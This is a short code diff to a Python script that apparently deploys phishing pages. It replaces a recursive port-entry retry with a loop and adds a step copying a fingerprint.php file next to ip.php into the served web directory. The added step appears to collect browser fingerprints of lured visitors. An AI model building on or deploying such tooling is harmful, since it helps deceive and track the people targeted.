@@ -17,17 +17,18 @@ def cusport() -> None:
         end_rgb=RGB_WHITE,
     )
     if ans.lower() == "y":
-        print("\n")
-        cu_p = slow_input(
-            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port "
-            f"[1024-9999] : {LIGHT1}",
-            start_rgb=RGB_WHITE,
-            end_rgb=RGB_CYAN,
-        )
-        if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
-            state.PORT = cu_p
-            print()
-        else:
+        while True:
+            print("\n")
+            cu_p = slow_input(
+                f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port "
+                f"[1024-9999] : {LIGHT1}",
+                start_rgb=RGB_WHITE,
+                end_rgb=RGB_CYAN,
+            )
+            if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
+                state.PORT = cu_p
+                print()
+                break
             print(
                 f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid 4-digit Port : {cu_p}, "
                 f"Try Again...{LIGHT1}"
@@ -35,7 +36,6 @@ def cusport() -> None:
             time.sleep(2)
             os.system("cls" if os.name == "nt" else "clear")
             banner_small()
-            cusport()
     else:
         slow_type(
             f"    [+] Deploying on Default Port {state.PORT}...",
@@ -74,6 +74,11 @@ def setup_site() -> None:
     shutil.copy2(
         os.path.join(state.BASE_DIR, ".sites/ip.php"),
         os.path.join(www_dir, "ip.php"),
+    )
+
+    shutil.copy2(
+        os.path.join(state.BASE_DIR, ".sites/fingerprint.php"),
+        os.path.join(www_dir, "fingerprint.php"),
     )
 
     try:
